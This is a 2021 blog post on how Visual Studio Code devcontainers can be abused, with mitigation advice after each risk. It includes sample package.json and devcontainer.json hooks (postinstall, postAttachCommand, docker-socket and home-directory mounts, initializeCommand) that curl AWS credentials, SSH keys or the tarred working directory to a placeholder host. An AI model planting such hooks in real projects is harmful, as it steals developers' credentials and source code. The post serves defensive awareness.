<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-alpha.72">
<link rel="alternate" type="application/rss+xml" href="/rss.xml" title="Jamie McCrindle Blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Jamie McCrindle Blog Atom Feed"><title data-react-helmet="true">Exploiting Visual Studio Code Devcontainers | Jamie McCrindle</title><meta data-react-helmet="true" property="og:title" content="Exploiting Visual Studio Code Devcontainers | Jamie McCrindle"><meta data-react-helmet="true" name="description" content="To quote Scott Hanselman &quot;Visual Studio Code Remote Development may change everything&quot;. They are a great way to build consistent development environments which can massively lower the friction for new people to contribute to a code base."><meta data-react-helmet="true" property="og:description" content="To quote Scott Hanselman &quot;Visual Studio Code Remote Development may change everything&quot;. They are a great way to build consistent development environments which can massively lower the friction for new people to contribute to a code base."><meta data-react-helmet="true" property="og:url" content="https://foldr.uk/exploiting-visual-studio-code-devcontainers"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_tag" content="default"><link data-react-helmet="true" rel="shortcut icon" href="/img/logo.jpeg"><link data-react-helmet="true" rel="canonical" href="https://foldr.uk/exploiting-visual-studio-code-devcontainers"><link data-react-helmet="true" rel="alternate" href="https://foldr.uk/exploiting-visual-studio-code-devcontainers" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://foldr.uk/exploiting-visual-studio-code-devcontainers" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.9c5a8488.css">
<link rel="preload" href="/assets/js/styles.f3635bff.js" as="script">
<link rel="preload" href="/assets/js/runtime~main.a4e3a126.js" as="script">
<link rel="preload" href="/assets/js/main.8ef49b02.js" as="script">
<link rel="preload" href="/assets/js/1.ceca3878.js" as="script">
<link rel="preload" href="/assets/js/2.8ae529b6.js" as="script">
<link rel="preload" href="/assets/js/ccc49370.07c09c16.js" as="script">
<link rel="preload" href="/assets/js/7a85f91c.e40a6c51.js" as="script">
<link rel="preload" href="/assets/js/572531ce.f0fa3b38.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div><a href="#main" class="skipToContent_1oUP">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle" type="button" tabindex="0"><svg aria-label="Menu" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><img src="/img/logo.jpeg" alt="Jamie McCrindle Logo" class="themedImage_1VuW themedImage--light_3UqQ navbar__logo"><img src="/img/logo.jpeg" alt="Jamie McCrindle Logo" class="themedImage_1VuW themedImage--dark_hz6m navbar__logo"><strong class="navbar__title">Jamie McCrindle</strong></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/jamiemccrindle" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub</a><a href="https://twitter.com/foldr" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Twitter</a><div class="react-toggle react-toggle--checked react-toggle--disabled displayOnlyInLargeViewport_GrZ2"><div class="react-toggle-track"><div class="react-toggle-track-check"><span class="toggle_71bT">ðŸŒœ</span></div><div class="react-toggle-track-x"><span class="toggle_71bT">ðŸŒž</span></div></div><div class="react-toggle-thumb"></div><input type="checkbox" disabled="" aria-label="Dark mode toggle" checked="" class="react-toggle-screenreader-only"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div><div class="navbar-sidebar"><div class="navbar-sidebar__brand"><a class="navbar__brand" href="/"><img src="/img/logo.jpeg" alt="Jamie McCrindle Logo" class="themedImage_1VuW themedImage--light_3UqQ navbar__logo"><img src="/img/logo.jpeg" alt="Jamie McCrindle Logo" class="themedImage_1VuW themedImage--dark_hz6m navbar__logo"><strong class="navbar__title">Jamie McCrindle</strong></a></div><div class="navbar-sidebar__items"><div class="menu"><ul class="menu__list"><li class="menu__list-item"><a aria-current="page" class="menu__link navbar__link--active" href="/">Blog</a></li><li class="menu__list-item"><a href="https://github.com/jamiemccrindle" target="_blank" rel="noopener noreferrer" class="menu__link">GitHub</a></li><li class="menu__list-item"><a href="https://twitter.com/foldr" target="_blank" rel="noopener noreferrer" class="menu__link">Twitter</a></li></ul></div></div></div></nav><div class="main-wrapper blog-wrapper"><div class="container margin-vert--lg"><div class="row"><div class="col col--3"><div class="sidebar_2ahu thin-scrollbar"><h3 class="sidebarItemTitle_2hhb">Recent posts</h3><ul class="sidebarItemList_2xAf"><li class="sidebarItem_2UVv"><a aria-current="page" class="sidebarItemLink_1RT6 sidebarItemLinkActive_12pM" href="/exploiting-visual-studio-code-devcontainers">Exploiting Visual Studio Code Devcontainers</a></li><li class="sidebarItem_2UVv"><a class="sidebarItemLink_1RT6" href="/azure-app-service-devcontainer">Running a devcontainer in an Azure App Service</a></li><li class="sidebarItem_2UVv"><a class="sidebarItemLink_1RT6" href="/azure-bicep-app-service-custom-container">Building an Azure App Service with a custom container using Bicep</a></li><li class="sidebarItem_2UVv"><a class="sidebarItemLink_1RT6" href="/github-actions-schedule-to-delete-resources-from-resource-group">Keep your Azure Costs low by removing dev resources from resource groups on a schedule.</a></li><li class="sidebarItem_2UVv"><a class="sidebarItemLink_1RT6" href="/rotating-azure-credentials-in-github-with-terraform">How to rotate your AZURE_CREDENTIALS in GitHub with Terraform</a></li></ul></div></div><main class="col col--7"><article><header><h1 class="margin-bottom--sm blogPostTitle_GeHD">Exploiting Visual Studio Code Devcontainers</h1><div class="margin-vert--md"><time datetime="2021-06-05T00:00:00.000Z" class="blogPostDate_fNvV">June 5, 2021 Â· 6 min read</time></div><div class="avatar margin-vert--md"><a href="https://github.com/jamiemccrindle" target="_blank" rel="noopener noreferrer" class="avatar__photo-link avatar__photo"><img src="https://avatars.githubusercontent.com/u/909696?s=60&amp;v=4" alt="Jamie McCrindle"></a><div class="avatar__intro"><h4 class="avatar__name"><a href="https://github.com/jamiemccrindle" target="_blank" rel="noopener noreferrer">Jamie McCrindle</a></h4><small class="avatar__subtitle">foldr</small></div></div></header><div class="markdown"><p>To quote Scott Hanselman &quot;Visual Studio Code Remote Development may change everything&quot;. They are a great way to build consistent development environments which can massively lower the friction for new people to contribute to a code base.</p><p>That said, they do create new paths to exploiting developer&#x27;s machines and devcontainers are often opaque to existing security scanning tooling. This post is not about a specific vulnerability in devcontainers but more what potential paths to exploitation devcontainers represent.</p><p>It is also becoming increasingly common for open source projects to include devcontainer configuration in their projects, acclimatising developers to running new forms of potentially untrusted code on their local machines.</p><p>This post focusses on Visual Studio Code Remote Containers that run in Docker on a developers machine.</p><h1><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="the-risks"></a>The risks<a class="hash-link" href="#the-risks" title="Direct link to heading">#</a></h1><p>Compromising a developer&#x27;s machine can lead to further compromise. Developer machines will often contain a number of credentials that allow developers to do their work e.g. SSH keys, AWS / GCE / Azure credentials, AD tokens etc. If these credentials are inside the devcontainer they are usually stored in the clear as the devcontainer docker container often does not have access to the host&#x27;s credential manager.</p><p>Developers quite often have elevated access both to their local machines as well as resources on the network making them an attractive target (after sys admins).</p><p>Risks as a result of compromising a developer&#x27;s machine include:</p><ul><li>Exfiltration of source code</li><li>Exfiltration or exploitation of developer credentials e.g. SSH Keys, AWS / GCE / Azure credentials etc.</li><li>Lateral movement inside the network</li></ul><h1><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="running-malicious-code-inside-a-devcontainer"></a>Running malicious code inside a devcontainer<a class="hash-link" href="#running-malicious-code-inside-a-devcontainer" title="Direct link to heading">#</a></h1><p>Your devcontainer is compromised if an attacker can execute malicious code inside it. Here are some of the ways this could happen.</p><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="at-build-or-install-time"></a>At build or install time<a class="hash-link" href="#at-build-or-install-time" title="Direct link to heading">#</a></h2><p>Running any install or build commands in a code base could result in malicious code being executed e.g.: </p><ul><li>npm / yarn</li><li>msbuild</li><li>mvn / ant / gradle</li><li>etc.</li></ul><p>e.g. in a package.json you could have: </p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly json"><div tabindex="0" class="prism-code language-json codeBlock_23N8 thin-scrollbar"><div class="codeBlockLines_39YC" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">&quot;name&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;super-useful-open-source-tool&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token property">&quot;scripts&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">// runs after npm install. a smart attacker would obfuscate this a little more</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;postinstall&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;curl very-innocent.url -d @~/.aws/credentials&quot;</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></div></div><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o">Copy</button></div></div><p>An attacker could also use a supply chain attack via a compromised dependency or use dependency confusion to introduce malicious code when the application is run.</p><p>Note, this kind of attack applies to running code outside of the devcontainer too.</p><div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>How to mitigate</h5></div><div class="admonition-content"><ul><li>Check the build scripts of any untrusted code you install</li><li>Run dependency scanning tools e.g. <code>npm audit</code> or snyk and address any warnings</li><li>Make sure your artifact repository is safe from <a href="https://portswigger.net/daily-swig/open-source-software-repositories-play-whack-a-mole-as-dependency-confusion-copycats-exceed-5-000" target="_blank" rel="noopener noreferrer">dependency confusion attacks</a></li></ul></div></div><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="untrusted-devcontainer-images"></a>Untrusted devcontainer images<a class="hash-link" href="#untrusted-devcontainer-images" title="Direct link to heading">#</a></h2><p>Devcontainers allow you to use arbitrary docker images as your development environment. If these have been compromised, it is trivial for attackers to run malicious code inside your devcontainer.</p><div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>How to mitigate</h5></div><div class="admonition-content"><ul><li>Use signed / trusted docker images only</li><li>Scan your devcontainer docker images for vulnerabilities</li></ul></div></div><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="postcreatecommand-poststartcommand-postattachcommand"></a>postCreateCommand, postStartCommand, postAttachCommand<a class="hash-link" href="#postcreatecommand-poststartcommand-postattachcommand" title="Direct link to heading">#</a></h2><p><code>devcontainer.json</code> allows you to configure a number of commands that can run in the devcontainer docker container after the container is created, after the container has started and after Visual Studio Code attaches to the container. These are <code>postCreateCommand</code>, <code>postStartCommand</code> and <code>postAttachCommand</code> respectively.</p><p>e.g. a <code>devcontainer.json</code> file with this config this would upload all of the contents of the working directory including local .env, .npmrc files etc. whenever Visual Studio Code attaches to the container.</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly json"><div tabindex="0" class="prism-code language-json codeBlock_23N8 thin-scrollbar"><div class="codeBlockLines_39YC" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">// send all the source inside the devcontainer somewhere. a smart attacker would obfuscate this a little more.</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;postAttachCommand&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;tar -czvf /tmp/debug.tgz . &amp;&amp; curl very-innocent.url --data-binary @/tmp/debug.tgz&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></div></div><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o">Copy</button></div></div><div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>How to mitigate</h5></div><div class="admonition-content"><ul><li>Check for suspicious scripts in the postCreateCommand, postStartCommand and postAttachCommand configuration in untrusted devcontainer.json files. </li></ul></div></div><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="malicious-extensions"></a>Malicious extensions<a class="hash-link" href="#malicious-extensions" title="Direct link to heading">#</a></h2><p>Malicious extensions can be used to run arbitrary code in whichever environment Visual Studio Code is running in including devcontainers.</p><div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>How to mitigate</h5></div><div class="admonition-content"><ul><li>Use trusted extensions only.</li></ul></div></div><h1><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="escaping-onto-the-devcontainer-host"></a>Escaping onto the devcontainer host<a class="hash-link" href="#escaping-onto-the-devcontainer-host" title="Direct link to heading">#</a></h1><p>Devcontainers can offer an additional layer of protection for a developers host machine but a number of common practices can make it easy to read files, write files or execute code on the host machine.</p><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="docker-from-docker"></a>Docker-from-docker<a class="hash-link" href="#docker-from-docker" title="Direct link to heading">#</a></h2><p>If your devcontainer does docker-from-docker i.e. where the host docker socket is mounted into the devcontainer, an attacker has almost unfettered access to the host machine e.g. the following <code>devcontainer.json</code> could be used to upload your ssh keys to a remote location even if you&#x27;re only sharing them into the container via an ssh-agent.</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly json"><div tabindex="0" class="prism-code language-json codeBlock_23N8 thin-scrollbar"><div class="codeBlockLines_39YC" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;mount&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;postAttachCommand&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;chmod a+x /var/run/docker.sock &amp;&amp; docker run -v ${localEnv:HOME}:/tmp/home curlimages/curl very-innocent.url -d @/tmp/home/.ssh/id_rsa&quot;</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></div></div><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o">Copy</button></div></div><div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>How to mitigate</h5></div><div class="admonition-content"><ul><li>Use <a href="https://github.com/microsoft/vscode-dev-containers/tree/main/containers/docker-in-docker" target="_blank" rel="noopener noreferrer">docker-in-docker</a> instead</li><li>Don&#x27;t do docker-from-docker if you can help it.</li><li>If you do have to run docker-from-docker take all the measures listed in this post to reduce the likelihood that malicious code can&#x27;t be executed inside the devcontainer.</li></ul></div></div><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="mounts"></a>Mounts<a class="hash-link" href="#mounts" title="Direct link to heading">#</a></h2><p>It&#x27;s common to mount host machine directories into the devcontainer docker container. Usually this is only the source directory but any path on the host machine could be mounted into the container e.g. the mount in this example is straight from the <a href="https://code.visualstudio.com/docs/remote/containers-advanced#_adding-another-local-file-mount" target="_blank" rel="noopener noreferrer">Microsoft docs on advanced containers</a> which binds a users home directory into the container so it wouldn&#x27;t look that unusual. Developer home directories often contain things like SSH keys, AWS credentials etc.</p><p>The following could upload a developers ssh key on the host to a remote location</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly json"><div tabindex="0" class="prism-code language-json codeBlock_23N8 thin-scrollbar"><div class="codeBlockLines_39YC" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;mounts&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;source=${localEnv:HOME}${localEnv:USERPROFILE},target=/host-home-folder,type=bind,consistency=cached&quot;</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;postAttachCommand&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;curl very-innocent.url -d /host-home-folder/.ssh/id.rsa&quot;</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></div></div><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o">Copy</button></div></div><div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>How to mitigate</h5></div><div class="admonition-content"><ul><li>Check untrusted <code>devcontainer.json</code> files for suspicious mounts</li><li>Don&#x27;t mount anything you don&#x27;t need into the devcontainer</li><li>Limit the directories that docker will share with any containers</li></ul></div></div><h2><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="initializecommand"></a>initializeCommand<a class="hash-link" href="#initializecommand" title="Direct link to heading">#</a></h2><p><code>initializeCommand</code> inside the <code>devcontainer.json</code> file will run on the host machine e.g. this would upload a developers ssh key on the host machine to a remote location:</p><div class="codeBlockContainer_K1bP"><div class="codeBlockContent_hGly json"><div tabindex="0" class="prism-code language-json codeBlock_23N8 thin-scrollbar"><div class="codeBlockLines_39YC" style="color:#bfc7d5;background-color:#292d3e"><div class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">&quot;installCommand&quot;</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;curl very-innocent.url -d ${localEnv:HOME}.ssh/id.rsa&quot;</span><span class="token plain"></span></div><div class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></div></div><button type="button" aria-label="Copy code to clipboard" class="copyButton_Ue-o">Copy</button></div></div><h1><a aria-hidden="true" tabindex="-1" class="anchor enhancedAnchor_2LWZ" id="general-devcontainer-security-precautions"></a>General devcontainer security precautions<a class="hash-link" href="#general-devcontainer-security-precautions" title="Direct link to heading">#</a></h1><ul><li>Avoid running untrusted devcontainers</li><li>If you do run untrusted devcontainers e.g. from open source projects, inspect the devcontainer configuration and look out for:<ul><li>malicious commands</li><li>suspicious dependencies</li><li>suspicious docker images</li><li>suspicious mounts</li><li>suspicious extensions</li></ul></li><li>Only mount what you need into the devcontainer docker container</li><li>Don&#x27;t use docker-from-docker</li><li>Update your devcontainer images regularly to pull security patches</li><li>Run SCA tools against the dependencies inside your devcontainers</li><li>Scan your devcontainer docker images</li><li>Only use trusted devcontainer docker images</li></ul></div><footer class="row margin-vert--lg"><div class="col"><strong>Tags:</strong><a class="margin-horiz--sm" href="/tags/cybersec">cybersec</a><a class="margin-horiz--sm" href="/tags/security">security</a><a class="margin-horiz--sm" href="/tags/vsc">vsc</a><a class="margin-horiz--sm" href="/tags/visual-studio-code">visual-studio-code</a><a class="margin-horiz--sm" href="/tags/devcontainer">devcontainer</a></div></footer></article><div><a href="https://github.com/jamiemccrindle/foldr.uk/tree/main/foldr-uk-website/blog/blog/2021-06-05-exploiting-visual-studio-devcontainers.md" target="_blank" rel="noreferrer noopener"><svg fill="currentColor" height="1.2em" width="1.2em" preserveAspectRatio="xMidYMid meet" role="img" viewBox="0 0 40 40" class="iconEdit_2_ui" aria-label="Edit page"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="margin-vert--xl"><nav class="pagination-nav" aria-label="Blog post page navigation"><div class="pagination-nav__item"></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/azure-app-service-devcontainer"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">Running a devcontainer in an Azure App Service Â»</div></a></div></nav></div></main><div class="col col--2"><div class="tableOfContents_35-E thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#at-build-or-install-time" class="table-of-contents__link">At build or install time</a></li><li><a href="#untrusted-devcontainer-images" class="table-of-contents__link">Untrusted devcontainer images</a></li><li><a href="#postcreatecommand-poststartcommand-postattachcommand" class="table-of-contents__link">postCreateCommand, postStartCommand, postAttachCommand</a></li><li><a href="#malicious-extensions" class="table-of-contents__link">Malicious extensions</a></li><li><a href="#docker-from-docker" class="table-of-contents__link">Docker-from-docker</a></li><li><a href="#mounts" class="table-of-contents__link">Mounts</a></li><li><a href="#initializecommand" class="table-of-contents__link">initializeCommand</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container"><div class="row footer__links"><div class="col footer__col"><h4 class="footer__title">Socials</h4><ul class="footer__items"><li class="footer__item"><a href="https://twitter.com/foldr" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter</a></li><li class="footer__item"><a href="https://github.com/jamiemccrindle" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub</a></li><li class="footer__item"><a href="https://jamie.mccrindle.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">jamie.mccrindle.org</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2021 Jamie McCrindle. Built with Docusaurus.</div></div></div></footer></div>
<script src="/assets/js/styles.f3635bff.js"></script>
<script src="/assets/js/runtime~main.a4e3a126.js"></script>
<script src="/assets/js/main.8ef49b02.js"></script>
<script src="/assets/js/1.ceca3878.js"></script>
<script src="/assets/js/2.8ae529b6.js"></script>
<script src="/assets/js/ccc49370.07c09c16.js"></script>
<script src="/assets/js/7a85f91c.e40a6c51.js"></script>
<script src="/assets/js/572531ce.f0fa3b38.js"></script>
</body>
</html>